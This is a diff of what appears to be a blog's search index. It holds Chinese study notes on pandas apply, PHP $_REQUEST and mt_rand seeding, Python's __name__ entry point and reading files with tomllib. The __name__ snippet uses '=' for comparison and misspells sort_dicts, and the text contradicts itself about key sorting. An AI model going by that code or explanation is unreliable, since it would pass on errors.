-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，接受额外参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_value</span>(<span class="params">x, value</span>):</span><br><span class="line">    <span class="keyword">return</span> x + value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 并传递额外参数</span></span><br><span class="line">result = s.apply(add_value, args=(<span class="number">3</span>,))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>在这个例子中，<code>args</code> 参数是一个元组，包含要传递给 <code>add_value</code> 函数的额外参数。</p>
-<h3 id="4-处理缺失值"><a href="#4-处理缺失值" class="headerlink" title="4. 处理缺失值"></a>4. 处理缺失值</h3><p><code>apply</code> 方法会自动处理缺失值（<code>NaN</code>），它会将缺失值原样保留。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, np.nan, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法</span></span><br><span class="line">result = s.apply(square)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，<code>NaN</code> 值在处理后依然是 <code>NaN</code>。</p>
-<h3 id="5-返回不同类型结果"><a href="#5-返回不同类型结果" class="headerlink" title="5. 返回不同类型结果"></a>5. 返回不同类型结果</h3><p><code>apply</code> 方法可以返回不同类型的结果，例如返回 <code>Series</code> 或 <code>DataFrame</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，返回一个 Series</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_function</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> pd.Series([row[<span class="string">&#x27;A&#x27;</span>] * <span class="number">2</span>, row[<span class="string">&#x27;B&#x27;</span>] * <span class="number">3</span>], index=[<span class="string">&#x27;A_new&#x27;</span>, <span class="string">&#x27;B_new&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法</span></span><br><span class="line">result = df.apply(custom_function, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>这里自定义函数返回一个 <code>Series</code>，<code>apply</code> 会将这些 <code>Series</code> 组合成一个新的 <code>DataFrame</code>。</p>
-<p>综上所述，<code>pandas</code> 的 <code>apply</code> 方法为数据处理提供了极大的灵活性，能帮助你高效地对数据进行自定义操作。</p>
-<h2 id="读取tsv格式文件"><a href="#读取tsv格式文件" class="headerlink" title="读取tsv格式文件"></a>读取tsv格式文件</h2><ul>
-<li><p>我有如下图一个tsv格式文件:</p>
-</li>
-<li><img src="/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/image-20250310134945342.png" class="" title="image-20250310134945342">
-</li>
-<li><p>我该怎么把指定的列提取出来呢</p>
-</li>
-<li></li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>pandas库</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php超全局变量</title>
     <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%E6%B3%A8%E8%A7%A3/</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>php超全局变量特性注解</title>
+    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
+    <content><![CDATA[<h3 id="php超全局变量特性注解"><a href="#php超全局变量特性注解" class="headerlink" title="php超全局变量特性注解"></a>php超全局变量特性注解</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>1.它最大的特点就是,$_REQUEST超全局变量为一个复合变量,它可以接受来自于$_GET、$_POST 和 $_COOKIE 传递过来的值。<br>2.它的设计初衷是为了方便开发者在处理用户输入时，无需关心数据是通过哪种方式提交的，都能统一获取。<br>3.所以如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&quot;file&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>我们直接在url里面加上:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=xxx</span><br></pre></td></tr></table></figure>
+<p>就可以让$_REQUEST变量接收到传递的参数。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php超全局变量</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php随机数的解释</title>
+    <url>/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
+    <content><![CDATA[<h4 id="mt-rand-函数对mt-srand-函数的继承"><a href="#mt-rand-函数对mt-srand-函数的继承" class="headerlink" title="mt_rand()函数对mt_srand()函数的继承"></a>mt_rand()函数对mt_srand()函数的继承</h4><p>如图下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 会输出与第一次使用 mt_srand(1) 后 mt_rand() 生成的第一个数相同的数</span></span><br></pre></td></tr></table></figure>
+<p>mt_srand()函数是用来设置随机数种子的，在第一个mt_rand函数调用后,会再次生成一个随机数,<br>在第二个mt_rand函数调用后,会根据第一次的随机数再次生成另一个随机数,以此类推。<br>而到了mt_srand(1)后,随机数种子被重置,<br>所以在第二次使用mt_srand播种后在下面那个mt_rand()调用中,会会生成与第一次生成的随机数相同的数。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php随机数函数</tag>
+      </tags>
   </entry>
   <entry>
     <title>python中对模块的引入</title>
@@ -1915,67 +1949,9 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
-    <title>php超全局变量特性注解</title>
-    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
-    <content><![CDATA[<h3 id="php超全局变量特性注解"><a href="#php超全局变量特性注解" class="headerlink" title="php超全局变量特性注解"></a>php超全局变量特性注解</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>1.它最大的特点就是,$_REQUEST超全局变量为一个复合变量,它可以接受来自于$_GET、$_POST 和 $_COOKIE 传递过来的值。<br>2.它的设计初衷是为了方便开发者在处理用户输入时，无需关心数据是通过哪种方式提交的，都能统一获取。<br>3.所以如下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&quot;file&quot;</span>];</span><br></pre></td></tr></table></figure>
-<p>我们直接在url里面加上:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=xxx</span><br></pre></td></tr></table></figure>
-<p>就可以让$_REQUEST变量接收到传递的参数。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php超全局变量</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python程序运行启动代码</title>
-    <url>/2025/01/26/python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%90%AF%E5%8A%A8%E4%BB%A3%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="常规程序启动入口"><a href="#常规程序启动入口" class="headerlink" title="常规程序启动入口"></a>常规程序启动入口</h1><h2 id="name-启动程序"><a href="#name-启动程序" class="headerlink" title="__name__启动程序"></a><code>__name__</code>启动程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    data : <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data,sort_dics=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="代码逐行解释"><a href="#代码逐行解释" class="headerlink" title="代码逐行解释"></a>代码逐行解释</h3><h4 id="if-name-main"><a href="#if-name-main" class="headerlink" title="if __name__ == &#39;__main__&#39;:"></a><code>if __name__ == &#39;__main__&#39;:</code></h4><ul>
-<li><p><code>__name__</code> 变量：</p>
-</li>
-<li><p>在 Python 中，每个模块（即<code>.py</code>文件）都有一个内置的<code>__name__</code>变量。这个变量的值取决于模块是如何被使用的。</p>
-<ul>
-<li><strong>当一个 Python 脚本作为主程序直接运行时</strong>，例如<strong>在命令行中使用 <code>python script.py</code> 来执行脚本</strong>，该脚本的 <code>__name__</code> 变量会被自动设置为 <code>&#39;__main__&#39;</code>。</li>
-<li><strong>当一个 Python 脚本作为模块被其他脚本导入时</strong>，例如在 <code>another_script.py</code> 中使用 <code>import script</code>，那么 <code>script.py</code> 模块的 <code>__name__</code> 变量会被设置为该模块的名称（即 <code>&#39;script&#39;</code>）。</li>
-</ul>
-</li>
-<li><p><strong>条件判断</strong>：<code>if __name__ == &#39;__main__&#39;:</code> 这行代码的作用是检查当前脚本是否作为主程序直接运行。如果是，则执行下面缩进的代码块；如果脚本是作为模块被导入到其他脚本中，则不会执行该代码块。这种机制允许我们在一个脚本中既定义可复用的函数和类，又可以包含用于测试或直接执行的代码，同时避免在被导入时执行这些测试代码。</p>
-</li>
-</ul>
-<h4 id="data-dict-load-toml"><a href="#data-dict-load-toml" class="headerlink" title="data: dict = load_toml()"></a><code>data: dict = load_toml()</code></h4><ul>
-<li><strong>类型注解</strong>：<code>data: dict</code> 是 Python 的类型注解，它告诉开发者（以及一些静态类型检查工具，如 <code>mypy</code>）变量 <code>data</code> 预期的类型是字典（<code>dict</code>）。类型注解不会影响代码的实际运行，但可以提高代码的可读性和可维护性。</li>
-<li><strong>函数调用</strong>：<code>load_toml()</code> 是之前定义的函数，用于读取并解析 <code>config.toml</code> 文件。调用该函数会返回一个包含解析后 TOML 数据的字典，这个字典会被赋值给变量 <code>data</code>。</li>
-</ul>
-<h4 id="pprint-data-sort-dicts-False"><a href="#pprint-data-sort-dicts-False" class="headerlink" title="pprint(data, sort_dicts=False)"></a><code>pprint(data, sort_dicts=False)</code></h4><ul>
-<li><strong><code>pprint</code> 函数</strong>：<code>pprint</code> 是 Python 标准库 <code>pprint</code> 模块中的一个函数，用于以美观的格式打印复杂的数据结构，如嵌套的字典和列表。相比于普通的 <code>print</code> 函数，<code>pprint</code> 会对数据进行格式化，使其更易于阅读。</li>
-<li><strong><code>sort_dicts=False</code> 参数</strong>：在 Python 3.8 及以上版本中，<code>pprint</code> 函数默认会对字典的键进行排序后再打印。通过设置 <code>sort_dicts=False</code>，我们告诉 <code>pprint</code> 函数不要对字典的键进行排序，**(其实就是对字典的键按照字母顺序排序)**而是按照字典中键的原始顺序进行打印。这样可以保留 TOML 文件中键值对的原始顺序。即没有用字母顺序排序。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>py程序启动</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php随机数的解释</title>
-    <url>/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
-    <content><![CDATA[<h4 id="mt-rand-函数对mt-srand-函数的继承"><a href="#mt-rand-函数对mt-srand-函数的继承" class="headerlink" title="mt_rand()函数对mt_srand()函数的继承"></a>mt_rand()函数对mt_srand()函数的继承</h4><p>如图下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 会输出与第一次使用 mt_srand(1) 后 mt_rand() 生成的第一个数相同的数</span></span><br></pre></td></tr></table></figure>
-<p>mt_srand()函数是用来设置随机数种子的，在第一个mt_rand函数调用后,会再次生成一个随机数,<br>在第二个mt_rand函数调用后,会根据第一次的随机数再次生成另一个随机数,以此类推。<br>而到了mt_srand(1)后,随机数种子被重置,<br>所以在第二次使用mt_srand播种后在下面那个mt_rand()调用中,会会生成与第一次生成的随机数相同的数。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php随机数函数</tag>
-      </tags>
+    <title>python常见bug</title>
+    <url>/2025/03/18/python%E5%B8%B8%E8%A7%81bug/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>python异常捕获及处理</title>
@@ -2013,38 +1989,6 @@ int main()&#123;
       </categories>
       <tags>
         <tag>python异常</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python读取文件</title>
-    <url>/2025/01/26/python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="使用with方法读取文件"><a href="#使用with方法读取文件" class="headerlink" title="使用with方法读取文件"></a>使用with方法读取文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
-
-<p>把打开的文件对象赋值给 <code>f</code>，并不是将以二进制形式只读打开后的文件内容赋值给 <code>f</code>，下面为你详细解释。</p>
-<h3 id="文件对象的概念"><a href="#文件对象的概念" class="headerlink" title="文件对象的概念"></a>文件对象的概念</h3><p>在 Python 里，当使用 <code>open()</code> 函数打开一个文件时，它会返回一个文件对象。文件对象可以理解为是 Python 程序与实际存储在磁盘上的文件之间的一个 “桥梁” 或者 “通道”，借助这个文件对象，我们可以对文件执行各种操作，像读取文件内容、向文件写入内容等。</p>
-<p>**相当于意思就是:**当我们使用open对一个文件打开之后,那就是我们告诉代码,我们已经选中这个文件了哦,把它赋值给f,意思就是:</p>
-<p><strong>f</strong>代表了这个已经被二进制形式打开的文件</p>
-<h3 id="赋值操作的含义"><a href="#赋值操作的含义" class="headerlink" title="赋值操作的含义"></a>赋值操作的含义</h3><p><code>with open(&#39;./config.toml&#39;, &#39;rb&#39;) as f:</code> 这行代码中的 <code>as f</code>，是把 <code>open()</code> 函数返回的文件对象赋值给变量 <code>f</code>。也就是说，变量 <code>f</code> 现在代表着这个打开的文件，通过 <code>f</code> 可以对文件进行相关操作，而不是把文件的内容赋值给 <code>f</code>。</p>
-<h3 id="对比文件对象和文件内容"><a href="#对比文件对象和文件内容" class="headerlink" title="对比文件对象和文件内容"></a>对比文件对象和文件内容</h3><ul>
-<li><strong>文件对象</strong>：它是一个具有多种方法和属性的 Python 对象，能够让我们和文件进行交互。例如，通过文件对象可以调用 <code>read()</code> 方法读取文件内容、<code>write()</code> 方法写入文件内容、<code>close()</code> 方法关闭文件等。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(f))  <span class="comment"># 输出 &lt;class &#x27;_io.TextIOWrapper&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>文件内容</strong>：指的是存储在文件中的实际数据。要获取文件内容，需要调用文件对象的读取方法，比如 <code>read()</code>、<code>readline()</code> 或者 <code>readlines()</code> 等。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 通过文件对象 f 的 read() 方法读取文件内容</span></span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
-
-<h3 id="结合-tomllib-的例子"><a href="#结合-tomllib-的例子" class="headerlink" title="结合 tomllib 的例子"></a>结合 <code>tomllib</code> 的例子</h3><p>在使用 <code>tomllib.load(f)</code> 时，<code>f</code> 是文件对象，<code>tomllib.load()</code> 函数会通过这个文件对象去读取文件中的内容，并将其解析成 Python 字典。这里传递的是文件对象，而不是文件内容。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    data = tomllib.load(f)  <span class="comment"># tomllib.load() 通过文件对象 f 读取并解析文件内容</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
-
-<p>综上所述，把打开的文件对象赋值给 <code>f</code> 后，<code>f</code> 代表着与文件进行交互的接口，而不是文件的实际内容。要获取文件内容，需要使用文件对象提供的读取方法。</p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python读取文件</tag>
       </tags>
   </entry>
   <entry>
@@ -2167,6 +2111,71 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
+    <title>python程序运行启动代码</title>
+    <url>/2025/01/26/python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%90%AF%E5%8A%A8%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="常规程序启动入口"><a href="#常规程序启动入口" class="headerlink" title="常规程序启动入口"></a>常规程序启动入口</h1><h2 id="name-启动程序"><a href="#name-启动程序" class="headerlink" title="__name__启动程序"></a><code>__name__</code>启动程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    data : <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data,sort_dics=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码逐行解释"><a href="#代码逐行解释" class="headerlink" title="代码逐行解释"></a>代码逐行解释</h3><h4 id="if-name-main"><a href="#if-name-main" class="headerlink" title="if __name__ == &#39;__main__&#39;:"></a><code>if __name__ == &#39;__main__&#39;:</code></h4><ul>
+<li><p><code>__name__</code> 变量：</p>
+</li>
+<li><p>在 Python 中，每个模块（即<code>.py</code>文件）都有一个内置的<code>__name__</code>变量。这个变量的值取决于模块是如何被使用的。</p>
+<ul>
+<li><strong>当一个 Python 脚本作为主程序直接运行时</strong>，例如<strong>在命令行中使用 <code>python script.py</code> 来执行脚本</strong>，该脚本的 <code>__name__</code> 变量会被自动设置为 <code>&#39;__main__&#39;</code>。</li>
+<li><strong>当一个 Python 脚本作为模块被其他脚本导入时</strong>，例如在 <code>another_script.py</code> 中使用 <code>import script</code>，那么 <code>script.py</code> 模块的 <code>__name__</code> 变量会被设置为该模块的名称（即 <code>&#39;script&#39;</code>）。</li>
+</ul>
+</li>
+<li><p><strong>条件判断</strong>：<code>if __name__ == &#39;__main__&#39;:</code> 这行代码的作用是检查当前脚本是否作为主程序直接运行。如果是，则执行下面缩进的代码块；如果脚本是作为模块被导入到其他脚本中，则不会执行该代码块。这种机制允许我们在一个脚本中既定义可复用的函数和类，又可以包含用于测试或直接执行的代码，同时避免在被导入时执行这些测试代码。</p>
+</li>
+</ul>
+<h4 id="data-dict-load-toml"><a href="#data-dict-load-toml" class="headerlink" title="data: dict = load_toml()"></a><code>data: dict = load_toml()</code></h4><ul>
+<li><strong>类型注解</strong>：<code>data: dict</code> 是 Python 的类型注解，它告诉开发者（以及一些静态类型检查工具，如 <code>mypy</code>）变量 <code>data</code> 预期的类型是字典（<code>dict</code>）。类型注解不会影响代码的实际运行，但可以提高代码的可读性和可维护性。</li>
+<li><strong>函数调用</strong>：<code>load_toml()</code> 是之前定义的函数，用于读取并解析 <code>config.toml</code> 文件。调用该函数会返回一个包含解析后 TOML 数据的字典，这个字典会被赋值给变量 <code>data</code>。</li>
+</ul>
+<h4 id="pprint-data-sort-dicts-False"><a href="#pprint-data-sort-dicts-False" class="headerlink" title="pprint(data, sort_dicts=False)"></a><code>pprint(data, sort_dicts=False)</code></h4><ul>
+<li><strong><code>pprint</code> 函数</strong>：<code>pprint</code> 是 Python 标准库 <code>pprint</code> 模块中的一个函数，用于以美观的格式打印复杂的数据结构，如嵌套的字典和列表。相比于普通的 <code>print</code> 函数，<code>pprint</code> 会对数据进行格式化，使其更易于阅读。</li>
+<li><strong><code>sort_dicts=False</code> 参数</strong>：在 Python 3.8 及以上版本中，<code>pprint</code> 函数默认会对字典的键进行排序后再打印。通过设置 <code>sort_dicts=False</code>，我们告诉 <code>pprint</code> 函数不要对字典的键进行排序，**(其实就是对字典的键按照字母顺序排序)**而是按照字典中键的原始顺序进行打印。这样可以保留 TOML 文件中键值对的原始顺序。即没有用字母顺序排序。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>py程序启动</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python读取文件</title>
+    <url>/2025/01/26/python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="使用with方法读取文件"><a href="#使用with方法读取文件" class="headerlink" title="使用with方法读取文件"></a>使用with方法读取文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
+
+<p>把打开的文件对象赋值给 <code>f</code>，并不是将以二进制形式只读打开后的文件内容赋值给 <code>f</code>，下面为你详细解释。</p>
+<h3 id="文件对象的概念"><a href="#文件对象的概念" class="headerlink" title="文件对象的概念"></a>文件对象的概念</h3><p>在 Python 里，当使用 <code>open()</code> 函数打开一个文件时，它会返回一个文件对象。文件对象可以理解为是 Python 程序与实际存储在磁盘上的文件之间的一个 “桥梁” 或者 “通道”，借助这个文件对象，我们可以对文件执行各种操作，像读取文件内容、向文件写入内容等。</p>
+<p>**相当于意思就是:**当我们使用open对一个文件打开之后,那就是我们告诉代码,我们已经选中这个文件了哦,把它赋值给f,意思就是:</p>
+<p><strong>f</strong>代表了这个已经被二进制形式打开的文件</p>
+<h3 id="赋值操作的含义"><a href="#赋值操作的含义" class="headerlink" title="赋值操作的含义"></a>赋值操作的含义</h3><p><code>with open(&#39;./config.toml&#39;, &#39;rb&#39;) as f:</code> 这行代码中的 <code>as f</code>，是把 <code>open()</code> 函数返回的文件对象赋值给变量 <code>f</code>。也就是说，变量 <code>f</code> 现在代表着这个打开的文件，通过 <code>f</code> 可以对文件进行相关操作，而不是把文件的内容赋值给 <code>f</code>。</p>
+<h3 id="对比文件对象和文件内容"><a href="#对比文件对象和文件内容" class="headerlink" title="对比文件对象和文件内容"></a>对比文件对象和文件内容</h3><ul>
+<li><strong>文件对象</strong>：它是一个具有多种方法和属性的 Python 对象，能够让我们和文件进行交互。例如，通过文件对象可以调用 <code>read()</code> 方法读取文件内容、<code>write()</code> 方法写入文件内容、<code>close()</code> 方法关闭文件等。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(f))  <span class="comment"># 输出 &lt;class &#x27;_io.TextIOWrapper&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>文件内容</strong>：指的是存储在文件中的实际数据。要获取文件内容，需要调用文件对象的读取方法，比如 <code>read()</code>、<code>readline()</code> 或者 <code>readlines()</code> 等。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 通过文件对象 f 的 read() 方法读取文件内容</span></span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
+
+<h3 id="结合-tomllib-的例子"><a href="#结合-tomllib-的例子" class="headerlink" title="结合 tomllib 的例子"></a>结合 <code>tomllib</code> 的例子</h3><p>在使用 <code>tomllib.load(f)</code> 时，<code>f</code> 是文件对象，<code>tomllib.load()</code> 函数会通过这个文件对象去读取文件中的内容，并将其解析成 Python 字典。这里传递的是文件对象，而不是文件内容。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    data = tomllib.load(f)  <span class="comment"># tomllib.load() 通过文件对象 f 读取并解析文件内容</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+
+<p>综上所述，把打开的文件对象赋值给 <code>f</code> 后，<code>f</code> 代表着与文件进行交互的接口，而不是文件的实际内容。要获取文件内容，需要使用文件对象提供的读取方法。</p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python读取文件</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>re库</title>
     <url>/2025/03/01/re%E5%BA%93/</url>
     <content><![CDATA[]]></content>
@@ -2185,6 +2194,191 @@ int main()&#123;
       </categories>
       <tags>
